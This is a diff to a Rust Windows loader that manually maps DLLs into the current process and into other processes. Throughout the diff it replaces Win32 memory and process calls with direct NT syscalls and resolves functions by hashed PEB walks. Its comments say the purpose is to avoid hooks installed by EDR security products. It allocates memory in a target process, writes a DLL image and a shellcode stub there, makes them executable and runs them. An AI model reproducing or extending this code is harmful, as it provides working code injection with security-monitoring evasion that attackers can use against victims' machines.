@@ -7,17 +7,14 @@ use std::collections::HashMap;
 // Use winapi's c_void throughout to avoid type mismatches with winapi return values.
 use winapi::ctypes::c_void;
 use winapi::shared::ntdef::{LIST_ENTRY, UNICODE_STRING};
-use winapi::um::memoryapi::{
-    VirtualAlloc, VirtualAllocEx, VirtualFree, VirtualProtect, VirtualProtectEx,
-    WriteProcessMemory, ReadProcessMemory,
-};
+// Memory and process APIs are now dispatched through nt_syscall::syscall!
+// to avoid IAT-visible Win32 hooks.  Only constants remain from winapi.
 use winapi::um::winnt::{
     DLL_PROCESS_ATTACH, IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_DIRECTORY_ENTRY_EXPORT,
     IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY, IMAGE_SCN_MEM_EXECUTE, IMAGE_SCN_MEM_READ,
     IMAGE_SCN_MEM_WRITE, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
     PAGE_EXECUTE, PAGE_EXECUTE_READ, PAGE_NOACCESS, PAGE_READONLY, PAGE_READWRITE,
 };
-use winapi::um::processthreadsapi::{FlushInstructionCache, OpenProcess};
 use pe_resolve;
 
 
@@ -377,22 +374,38 @@ pub unsafe fn load_dll_in_memory(dll_bytes: &[u8]) -> Result<*mut c_void> {
     // 1. Allocate memory for the DLL.
     // Try the preferred image base first to avoid relocations when that VA
     // range is available, then fall back to an OS-chosen address.
-    let preferred_base = optional_header.windows_fields.image_base as *mut c_void;
-    let preferred_alloc = VirtualAlloc(
-        preferred_base,
-        optional_header.windows_fields.size_of_image as usize,
-        MEM_COMMIT | MEM_RESERVE,
-        PAGE_READWRITE,
+    // Use NtAllocateVirtualMemory to avoid IAT-visible VirtualAlloc hooks.
+    let _ = nt_syscall::init_syscall_infrastructure(); // idempotent
+
+    let preferred_base_ptr = optional_header.windows_fields.image_base as *mut c_void;
+    let image_size = optional_header.windows_fields.size_of_image as usize;
+    let mut preferred_alloc = preferred_base_ptr;
+    let mut alloc_size = image_size;
+    let pref_status = nt_syscall::syscall!(
+        "NtAllocateVirtualMemory",
+        -1isize as u64, // current process
+        &mut preferred_alloc as *mut _ as u64,
+        0u64,
+        &mut alloc_size as *mut _ as u64,
+        (MEM_COMMIT | MEM_RESERVE) as u64,
+        PAGE_READWRITE as u64,
     );
-    let (image_base, used_fallback_alloc) = if preferred_alloc.is_null() {
-        let fallback = VirtualAlloc(
-            std::ptr::null_mut(),
-            optional_header.windows_fields.size_of_image as usize,
-            MEM_COMMIT | MEM_RESERVE,
-            PAGE_READWRITE,
+    let preferred_ok = pref_status.map_or(false, |s| s >= 0) && !preferred_alloc.is_null();
+
+    let (image_base, used_fallback_alloc) = if !preferred_ok {
+        let mut fallback: *mut c_void = std::ptr::null_mut();
+        let mut fb_size = image_size;
+        let fb_status = nt_syscall::syscall!(
+            "NtAllocateVirtualMemory",
+            -1isize as u64,
+            &mut fallback as *mut _ as u64,
+            0u64,
+            &mut fb_size as *mut _ as u64,
+            (MEM_COMMIT | MEM_RESERVE) as u64,
+            PAGE_READWRITE as u64,
         );
-        if fallback.is_null() {
-            return Err(anyhow!("VirtualAlloc failed"));
+        if fb_status.map_or(true, |s| s < 0) || fallback.is_null() {
+            return Err(anyhow!("NtAllocateVirtualMemory failed"));
         }
         (fallback, true)
     } else {
@@ -436,7 +449,15 @@ pub unsafe fn load_dll_in_memory(dll_bytes: &[u8]) -> Result<*mut c_void> {
         fn drop(&mut self) {
             if !self.success {
                 unsafe {
-                    VirtualFree(self.ptr, 0, MEM_RELEASE);
+                    let mut base = self.ptr;
+                    let mut size: usize = 0;
+                    let _ = nt_syscall::syscall!(
+                        "NtFreeVirtualMemory",
+                        -1isize as u64,
+                        &mut base as *mut _ as u64,
+                        &mut size as *mut _ as u64,
+                        MEM_RELEASE as u64,
+                    );
                 }
             }
         }
@@ -817,17 +838,21 @@ pub unsafe fn load_dll_in_memory(dll_bytes: &[u8]) -> Result<*mut c_void> {
         };
         let mut old_prot = 0;
         // Use the larger of virtual_size and size_of_raw_data: a linker may
-        // set VirtualSize to 0 (optimisation), which would make VirtualProtect
-        // a no-op and leave the section with the wrong permissions.
+        // set VirtualSize to 0 (optimisation), which would make protection
+        // change a no-op and leave the section with the wrong permissions.
         let prot_size = std::cmp::max(
             section.virtual_size as usize,
             section.size_of_raw_data as usize,
         );
-        VirtualProtect(
-            image_base.add(section.virtual_address as usize),
-            prot_size,
-            prot,
-            &mut old_prot,
+        let mut prot_base = image_base.add(section.virtual_address as usize);
+        let mut prot_size_val = prot_size;
+        let _ = nt_syscall::syscall!(
+            "NtProtectVirtualMemory",
+            -1isize as u64,
+            &mut prot_base as *mut _ as u64,
+            &mut prot_size_val as *mut _ as u64,
+            prot as u64,
+            &mut old_prot as *mut _ as u64,
         );
     }
 
@@ -835,10 +860,11 @@ pub unsafe fn load_dll_in_memory(dll_bytes: &[u8]) -> Result<*mut c_void> {
     //     mapped TLS callback or DLL entrypoint code executes.
     #[cfg(windows)]
     {
-        winapi::um::processthreadsapi::FlushInstructionCache(
-            winapi::um::processthreadsapi::GetCurrentProcess(),
-            image_base as *const c_void,
-            optional_header.windows_fields.size_of_image as usize,
+        let _ = nt_syscall::syscall!(
+            "NtFlushInstructionCache",
+            -1isize as u64,
+            image_base as u64,
+            optional_header.windows_fields.size_of_image as u64,
         );
     }
 
@@ -965,14 +991,15 @@ unsafe fn read_remote_struct<T>(
 ) -> Option<T> {
     let mut value: T = std::mem::zeroed();
     let mut bytes_read = 0usize;
-    let ok = ReadProcessMemory(
-        process,
-        remote,
-        &mut value as *mut _ as *mut c_void,
-        std::mem::size_of::<T>(),
-        &mut bytes_read,
+    let status = nt_syscall::syscall!(
+        "NtReadVirtualMemory",
+        process as u64,
+        remote as u64,
+        &mut value as *mut _ as u64,
+        std::mem::size_of::<T>() as u64,
+        &mut bytes_read as *mut _ as u64,
     );
-    if ok == 0 || bytes_read != std::mem::size_of::<T>() {
+    if status.map_or(true, |s| s < 0) || bytes_read != std::mem::size_of::<T>() {
         None
     } else {
         Some(value)
@@ -1038,14 +1065,15 @@ unsafe fn get_remote_ntdll_base(target_process: winapi::shared::ntdef::HANDLE) -
             let chars = (base_name.Length / 2) as usize;
             let mut wide = vec![0u16; chars];
             let mut bytes_read = 0usize;
-            let ok = ReadProcessMemory(
-                target_process,
-                base_name.Buffer as *const c_void,
-                wide.as_mut_ptr() as *mut c_void,
-                base_name.Length as usize,
-                &mut bytes_read,
+            let status = nt_syscall::syscall!(
+                "NtReadVirtualMemory",
+                target_process as u64,
+                base_name.Buffer as u64,
+                wide.as_mut_ptr() as u64,
+                base_name.Length as u64,
+                &mut bytes_read as *mut _ as u64,
             );
-            if ok != 0 && bytes_read == base_name.Length as usize {
+            if status.map_or(false, |s| s >= 0) && bytes_read == base_name.Length as usize {
                 let name = String::from_utf16_lossy(&wide).to_ascii_lowercase();
                 if name == "ntdll.dll" || name == "ntdll" {
                     return Some(dll_base);
@@ -1060,76 +1088,117 @@ unsafe fn get_remote_ntdll_base(target_process: winapi::shared::ntdef::HANDLE) -
 }
 
 /// Build a lowercase DLL-name → remote base-address map for every module loaded
-/// in `target_process`, using `CreateToolhelp32Snapshot` / `Module32First` /
-/// `Module32Next`.
+/// in `target_process`, using a remote PEB walk via `NtQueryInformationProcess`
+/// and `NtReadVirtualMemory`.
 ///
 /// Called when the shared-ASLR assumption does not hold (local and remote
 /// `ntdll.dll` bases differ), so that subsequent IAT resolution can use actual
 /// remote-process module bases rather than the local PEB-walk results.
 ///
+/// All APIs are dispatched through NT syscalls (via pe_resolve for
+/// `NtQueryInformationProcess` and `nt_syscall::syscall!` for reads) to avoid
+/// IAT-visible `CreateToolhelp32Snapshot` / `Module32First` / `Module32Next`
+/// hooks installed by EDR products.
+///
 /// # Errors
 ///
-/// Returns `Err` if snapshot creation, `GetProcessId`, or the initial
-/// `Module32First` enumeration fails.  In that case the caller must **not**
-/// proceed with local import addresses.
+/// Returns `Err` if the remote PEB cannot be read or the module list is
+/// corrupt.  In that case the caller must **not** proceed with local import
+/// addresses.
 unsafe fn build_remote_module_map(
     target_process: winapi::um::winnt::HANDLE,
 ) -> Result<HashMap<String, usize>> {
-    use winapi::um::handleapi::CloseHandle;
-    use winapi::um::processthreadsapi::GetProcessId;
-    use winapi::um::tlhelp32::{
-        CreateToolhelp32Snapshot, Module32First, Module32Next, MODULEENTRY32,
-        TH32CS_SNAPMODULE, TH32CS_SNAPMODULE32,
-    };
+    type NtQueryInformationProcessFn = unsafe extern "system" fn(
+        winapi::shared::ntdef::HANDLE,
+        u32,
+        *mut c_void,
+        u32,
+        *mut u32,
+    ) -> i32;
 
-    let pid = GetProcessId(target_process);
-    if pid == 0 {
+    // Resolve NtQueryInformationProcess via PEB walk (same pattern as
+    // get_remote_ntdll_base).  This avoids the hookable
+    // kernel32!CreateToolhelp32Snapshot IAT entry.
+    let local_ntdll =
+        pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"))
+            .ok_or_else(|| anyhow!("build_remote_module_map: ntdll not found via PEB walk"))?;
+    let ntqip_addr = pe_resolve::get_proc_address_by_hash(
+        local_ntdll,
+        pe_resolve::hash_str(b"NtQueryInformationProcess\0"),
+    )
+    .ok_or_else(|| anyhow!("build_remote_module_map: NtQueryInformationProcess not found"))?;
+    let ntqip: NtQueryInformationProcessFn = std::mem::transmute(ntqip_addr as *const ());
+
+    // Step 1: query the remote PEB address via NtQueryInformationProcess.
+    let mut pbi: ProcessBasicInformation = std::mem::zeroed();
+    let mut return_len = 0u32;
+    let status = ntqip(
+        target_process,
+        0, // ProcessBasicInformation
+        &mut pbi as *mut _ as *mut c_void,
+        std::mem::size_of::<ProcessBasicInformation>() as u32,
+        &mut return_len,
+    );
+    if status < 0 || pbi.peb_base_address.is_null() {
         return Err(anyhow!(
-            "build_remote_module_map: GetProcessId failed: {}",
-            std::io::Error::last_os_error()
+            "build_remote_module_map: NtQueryInformationProcess failed (status={status:#x})"
         ));
     }
 
-    let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
-    if snapshot == winapi::um::handleapi::INVALID_HANDLE_VALUE {
-        return Err(anyhow!(
-            "build_remote_module_map: CreateToolhelp32Snapshot failed for pid={pid}: {}",
-            std::io::Error::last_os_error()
-        ));
+    // Step 2: read PEB.Ldr to get the loader data structure.
+    let peb: PEB = read_remote_struct(target_process, pbi.peb_base_address as *const c_void)
+        .ok_or_else(|| anyhow!("build_remote_module_map: failed to read remote PEB"))?;
+    if peb.Ldr.is_null() {
+        return Err(anyhow!("build_remote_module_map: remote PEB.Ldr is null"));
     }
 
+    // Step 3: walk InLoadOrderModuleList starting at PEB.Ldr + 0x10.
+    // The list_head lives at offset 0x10 (InLoadOrderModuleList) inside
+    // PEB_LDR_DATA.  Each entry is an LDR_DATA_TABLE_ENTRY whose first field
+    // (InLoadOrderLinks) is the LIST_ENTRY that chains the list together.
+    let ldr: PEB_LDR_DATA = read_remote_struct(target_process, peb.Ldr as *const c_void)
+        .ok_or_else(|| anyhow!("build_remote_module_map: failed to read remote PEB_LDR_DATA"))?;
+    let list_head = (peb.Ldr as usize + 0x10) as *mut LIST_ENTRY; // InLoadOrderModuleList offset
+    let mut current = ldr.InLoadOrderModuleList.Flink;
+    let mut guard = 0usize;
     let mut map = HashMap::new();
-    let mut entry: MODULEENTRY32 = std::mem::zeroed();
-    entry.dwSize = std::mem::size_of::<MODULEENTRY32>() as u32;
 
-    if Module32First(snapshot, &mut entry) == 0 {
-        let err = std::io::Error::last_os_error();
-        CloseHandle(snapshot);
-        return Err(anyhow!(
-            "build_remote_module_map: Module32First failed for pid={pid}: {err}"
-        ));
-    }
+    while !current.is_null() && current != list_head && guard < 4096 {
+        guard += 1;
 
-    loop {
-        // szModule is a null-terminated ANSI char (i8) array; cast each byte to u8
-        // before UTF-8 conversion — ASCII DLL names are unchanged by the cast.
-        let name_bytes: Vec<u8> = entry
-            .szModule
-            .iter()
-            .take_while(|&&c| c != 0)
-            .map(|&c| c as u8)
-            .collect();
-        let dll_name = String::from_utf8_lossy(&name_bytes).to_ascii_lowercase();
-        map.insert(dll_name, entry.modBaseAddr as usize);
+        let entry: LDR_DATA_TABLE_ENTRY =
+            match read_remote_struct(target_process, current as *const c_void) {
+                Some(e) => e,
+                None => break,
+            };
 
-        entry = std::mem::zeroed();
-        entry.dwSize = std::mem::size_of::<MODULEENTRY32>() as u32;
-        if Module32Next(snapshot, &mut entry) == 0 {
-            break;
+        let dll_base = entry.DllBase as usize;
+        let base_name = entry.BaseDllName;
+        if dll_base != 0
+            && !base_name.Buffer.is_null()
+            && base_name.Length >= 2
+            && (base_name.Length as usize) <= 520
+        {
+            let chars = (base_name.Length / 2) as usize;
+            let mut wide = vec![0u16; chars];
+            let mut bytes_read = 0usize;
+            let read_status = nt_syscall::syscall!(
+                "NtReadVirtualMemory",
+                target_process as u64,
+                base_name.Buffer as u64,
+                wide.as_mut_ptr() as u64,
+                base_name.Length as u64,
+                &mut bytes_read as *mut _ as u64,
+            );
+            if read_status.map_or(false, |s| s >= 0) && bytes_read == base_name.Length as usize {
+                let name = String::from_utf16_lossy(&wide).to_ascii_lowercase();
+                map.insert(name, dll_base);
+            }
         }
+
+        current = entry.InLoadOrderLinks.Flink;
     }
 
-    CloseHandle(snapshot);
     Ok(map)
 }
 
@@ -1162,17 +1231,18 @@ unsafe fn resolve_remote_export(
     let read_bytes = |addr: usize, n: usize| -> Result<Vec<u8>> {
         let mut buf = vec![0u8; n];
         let mut bytes_read = 0usize;
-        let ok = ReadProcessMemory(
-            target_process,
-            addr as *const c_void,
-            buf.as_mut_ptr() as *mut c_void,
-            n,
-            &mut bytes_read,
+        let status = nt_syscall::syscall!(
+            "NtReadVirtualMemory",
+            target_process as u64,
+            addr as u64,
+            buf.as_mut_ptr() as u64,
+            n as u64,
+            &mut bytes_read as *mut _ as u64,
         );
-        if ok == 0 || bytes_read != n {
+        if status.map_or(true, |s| s < 0) || bytes_read != n {
             return Err(anyhow!(
-                "resolve_remote_export: ReadProcessMemory at {addr:#x} len={n} failed: {}",
-                std::io::Error::last_os_error()
+                "resolve_remote_export: NtReadVirtualMemory at {addr:#x} len={n} failed: status={:?}",
+                status
             ));
         }
         Ok(buf)
@@ -1346,7 +1416,7 @@ pub unsafe fn load_dll_in_remote_process(
     let remote_module_map: Option<HashMap<String, usize>> =
         if let (Some(local), Some(remote)) = (local_ntdll, remote_ntdll) {
             if local != remote {
-                log::warn!(
+                tracing::warn!(
                     "remote_manual_map: NTDLL base mismatch (local={:#x}, remote={:#x}). \
                      Shared ASLR assumption does not hold — resolving imports from \
                      remote process module list.",
@@ -1376,7 +1446,7 @@ pub unsafe fn load_dll_in_remote_process(
                             matches!((local_kernelbase, remote_kernelbase), (Some(l), Some(r)) if l != r);
 
                         if kernel32_mismatch || kernelbase_mismatch {
-                            log::warn!(
+                tracing::warn!(
                                 "remote_manual_map: shared-ASLR verification failed (kernel32 mismatch={}, kernelbase mismatch={}); resolving imports from remote process module list.",
                                 kernel32_mismatch,
                                 kernelbase_mismatch
@@ -1389,7 +1459,7 @@ pub unsafe fn load_dll_in_remote_process(
                     Err(err) => {
                         // Preserve the fast path when the extra verification step
                         // cannot be performed and ntdll already matches.
-                        log::warn!(
+                tracing::warn!(
                             "remote_manual_map: unable to verify kernel32/kernelbase base parity ({}); keeping shared-ASLR fast path",
                             err
                         );
@@ -1402,17 +1472,24 @@ pub unsafe fn load_dll_in_remote_process(
         };
 
     // ── Step 1: allocate in the remote process ────────────────────────────
-    let remote_base = VirtualAllocEx(
-        target_process,
-        std::ptr::null_mut(),
-        image_size,
-        MEM_COMMIT | MEM_RESERVE,
-        PAGE_READWRITE, // RW initially; per-section protections applied after sections are written
+    // Use NtAllocateVirtualMemory to avoid IAT-visible VirtualAllocEx hooks.
+    let _ = nt_syscall::init_syscall_infrastructure(); // idempotent
+
+    let mut remote_base: *mut c_void = std::ptr::null_mut();
+    let mut alloc_size = image_size;
+    let alloc_status = nt_syscall::syscall!(
+        "NtAllocateVirtualMemory",
+        target_process as u64,
+        &mut remote_base as *mut _ as u64,
+        0u64,
+        &mut alloc_size as *mut _ as u64,
+        (MEM_COMMIT | MEM_RESERVE) as u64,
+        PAGE_READWRITE as u64,
     );
-    if remote_base.is_null() {
+    if alloc_status.map_or(true, |s| s < 0) || remote_base.is_null() {
         return Err(anyhow!(
-            "VirtualAllocEx failed: {}",
-            std::io::Error::last_os_error()
+            "NtAllocateVirtualMemory(remote) failed: status={:?}",
+            alloc_status
         ));
     }
 
@@ -1557,17 +1634,18 @@ pub unsafe fn load_dll_in_remote_process(
                 // Read the relocation directory from the remote image.
                 let mut reloc_data = vec![0u8; reloc_size];
                 let mut bytes_read = 0usize;
-                let ok = ReadProcessMemory(
-                    target_process,
-                    (remote_base as usize + reloc_rva) as *const c_void,
-                    reloc_data.as_mut_ptr() as *mut c_void,
-                    reloc_size,
-                    &mut bytes_read,
+                let reloc_read_status = nt_syscall::syscall!(
+                    "NtReadVirtualMemory",
+                    target_process as u64,
+                    (remote_base as usize + reloc_rva) as u64,
+                    reloc_data.as_mut_ptr() as u64,
+                    reloc_size as u64,
+                    &mut bytes_read as *mut _ as u64,
                 );
-                if ok == 0 || bytes_read != reloc_size {
+                if reloc_read_status.map_or(true, |s| s < 0) || bytes_read != reloc_size {
                     return Err(anyhow!(
-                        "ReadProcessMemory for reloc directory failed: {}",
-                        std::io::Error::last_os_error()
+                        "NtReadVirtualMemory for reloc directory failed: status={:?}",
+                        reloc_read_status
                     ));
                 }
 
@@ -1597,13 +1675,14 @@ pub unsafe fn load_dll_in_remote_process(
                             10 => {
                                 let mut buf = [0u8; 8];
                                 let mut n = 0usize;
-                                let src = (remote_base as usize + field_rva) as *const c_void;
-                                ReadProcessMemory(
-                                    target_process,
+                                let src = (remote_base as usize + field_rva) as u64;
+                                let _ = nt_syscall::syscall!(
+                                    "NtReadVirtualMemory",
+                                    target_process as u64,
                                     src,
-                                    buf.as_mut_ptr() as *mut c_void,
-                                    8,
-                                    &mut n,
+                                    buf.as_mut_ptr() as u64,
+                                    8u64,
+                                    &mut n as *mut _ as u64,
                                 );
                                 let val = i64::from_le_bytes(buf);
                                 let patched = (val as isize + base_delta).to_le_bytes();
@@ -1613,13 +1692,14 @@ pub unsafe fn load_dll_in_remote_process(
                             3 => {
                                 let mut buf = [0u8; 4];
                                 let mut n = 0usize;
-                                let src = (remote_base as usize + field_rva) as *const c_void;
-                                ReadProcessMemory(
-                                    target_process,
+                                let src = (remote_base as usize + field_rva) as u64;
+                                let _ = nt_syscall::syscall!(
+                                    "NtReadVirtualMemory",
+                                    target_process as u64,
                                     src,
-                                    buf.as_mut_ptr() as *mut c_void,
-                                    4,
-                                    &mut n,
+                                    buf.as_mut_ptr() as u64,
+                                    4u64,
+                                    &mut n as *mut _ as u64,
                                 );
                                 let val = i32::from_le_bytes(buf);
                                 let patched =
@@ -1706,14 +1786,15 @@ pub unsafe fn load_dll_in_remote_process(
     // The CPU may have stale cached instruction bytes from before we wrote
     // the PE image, applied relocations, and fixed the IAT.  Flush the
     // entire mapped region in the target process so the remote thread always
-    // executes coherent code.  FlushInstructionCache is a no-op on x86/x64
+    // executes coherent code.  NtFlushInstructionCache is a no-op on x86/x64
     // (coherency is guaranteed by hardware) but it is the documented pattern
     // for portable correctness and satisfies AV/EDR expectations.
-    // SAFETY: target_process is a valid handle; remote_base and image_size
-    // describe the region we just wrote.
-    unsafe {
-        FlushInstructionCache(target_process, remote_base as *const c_void, image_size);
-    }
+    let _ = nt_syscall::syscall!(
+        "NtFlushInstructionCache",
+        target_process as u64,
+        remote_base as u64,
+        image_size as u64,
+    );
 
     // ── Step 5: invoke DllMain via a shellcode stub ───────────────────────
     // DllMain expects (HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved).
@@ -1743,22 +1824,27 @@ pub unsafe fn load_dll_in_remote_process(
         stub.extend_from_slice(&[0xC3]);
 
         // Allocate memory for the stub (RW first so we can write it).
-        let stub_mem = VirtualAllocEx(
-            target_process,
-            std::ptr::null_mut(),
-            stub.len(),
-            MEM_COMMIT | MEM_RESERVE,
-            PAGE_READWRITE,
+        let mut stub_mem: *mut c_void = std::ptr::null_mut();
+        let mut stub_alloc_size = stub.len();
+        let stub_alloc_status = nt_syscall::syscall!(
+            "NtAllocateVirtualMemory",
+            target_process as u64,
+            &mut stub_mem as *mut _ as u64,
+            0u64,
+            &mut stub_alloc_size as *mut _ as u64,
+            (MEM_COMMIT | MEM_RESERVE) as u64,
+            PAGE_READWRITE as u64,
         );
-        if stub_mem.is_null() {
+        if stub_alloc_status.map_or(true, |s| s < 0) || stub_mem.is_null() {
             return Err(anyhow!(
-                "VirtualAllocEx for DllMain stub failed: {}",
-                std::io::Error::last_os_error()
+                "NtAllocateVirtualMemory for DllMain stub failed: status={:?}",
+                stub_alloc_status
             ));
         }
 
+        // Write stub bytes via NtWriteVirtualMemory (already resolved above).
         let mut written = 0usize;
-        WriteProcessMemory(
+        nt_write_virtual_memory(
             target_process,
             stub_mem,
             stub.as_ptr() as *const c_void,
@@ -1767,13 +1853,16 @@ pub unsafe fn load_dll_in_remote_process(
         );
 
         // Make the stub executable (RX only — no need for write after writing).
+        let mut prot_base = stub_mem;
+        let mut prot_size = stub.len();
         let mut old_prot = 0u32;
-        VirtualProtectEx(
-            target_process,
-            stub_mem,
-            stub.len(),
-            PAGE_EXECUTE_READ,
-            &mut old_prot,
+        let _ = nt_syscall::syscall!(
+            "NtProtectVirtualMemory",
+            target_process as u64,
+            &mut prot_base as *mut _ as u64,
+            &mut prot_size as *mut _ as u64,
+            PAGE_EXECUTE_READ as u64,
+            &mut old_prot as *mut _ as u64,
         );
 
         // M-27: Use NtCreateThreadEx via PEB walk instead of hookable CreateRemoteThread.
